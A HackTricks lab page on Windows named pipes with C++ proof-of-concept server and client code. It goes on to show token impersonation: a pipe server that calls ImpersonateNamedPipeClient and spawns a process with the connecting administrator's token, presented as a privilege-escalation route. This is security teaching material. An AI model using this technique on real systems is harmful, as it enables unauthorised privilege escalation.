# Named Pipe Client Impersonation

## Named Pipe Client Impersonation

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**This information was copied from** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

## Overview

A `pipe` is a block of shared memory that processes can use for communication and data exchange.

`Named Pipes` is a Windows mechanism that enables two unrelated processes to exchange data between themselves, even if the processes are located on two different networks. It's very simar to client/server architecture as notions such as `a named pipe server` and a named `pipe client` exist.

A named pipe server can open a named pipe with some predefined name and then a named pipe client can connect to that pipe via the known name. Once the connection is established, data exchange can begin.

This lab is concerned with a simple PoC code that allows:

* creating a single-threaded dumb named pipe server that will accept one client connection
* named pipe server to write a simple message to the named pipe so that the pipe client can read it

## Code

Below is the PoC for both the server and the client:

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	return 0;
}
```
{% endtab %}

{% tab title="namedPipeClient.cpp" %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
	LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
	HANDLE clientPipe = NULL;
	BOOL isPipeRead = true;
	wchar_t message[MESSAGE_SIZE] = { 0 };
	DWORD bytesRead = 0;

	std::wcout << "Connecting to " << pipeName << std::endl;
	clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	
	while (isPipeRead) {
		isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
		std::wcout << "Received message: " << message;
	}

	return 0;
}
```
{% endtab %}
{% endtabs %}

## Execution

Below shows the named pipe server and named pipe client working as expected:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

Worth nothing that the named pipes communication by default uses SMB protocol:

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

Checking how the process maintains a handle to our named pipe `mantvydas-first-pipe`:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

Similary, we can see the client having an open handle to the named pipe:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

We can even see our pipe with powershell:

```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (3).png>)

## Token Impersonation

{% hint style="info" %}
Note that in order to impersonate the token of the client process you need to have (the server process creating the pipe) the **`SeImpersonate`** token privilege
{% endhint %}

It is possible for the named pipe server to impersonate the named pipe client's security context by leveraging a `ImpersonateNamedPipeClient` API call which in turn changes the named pipe server's current thread's token with that of the named pipe client's token.

We can update the the named pipe server's code like this to achieve the impersonation - note that modifications are seen in line 25 and below:

```cpp
int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	std::wcout << "Impersonating the client..." << std::endl;
	ImpersonateNamedPipeClient(serverPipe);
	err = GetLastError();	

	STARTUPINFO	si = {};
	wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
	PROCESS_INFORMATION pi = {};
	HANDLE threadToken = GetCurrentThreadToken();
	CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	return 0;
}
```

Running the server and connecting to it with the client that is running under administrator@offense.local security context, we can see that the main thread of the named server pipe assumed the token of the named pipe client - offense\administrator, although the PipeServer.exe itself is running under ws01\mantvydas security context. Sounds like a good way to escalate privileges?

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
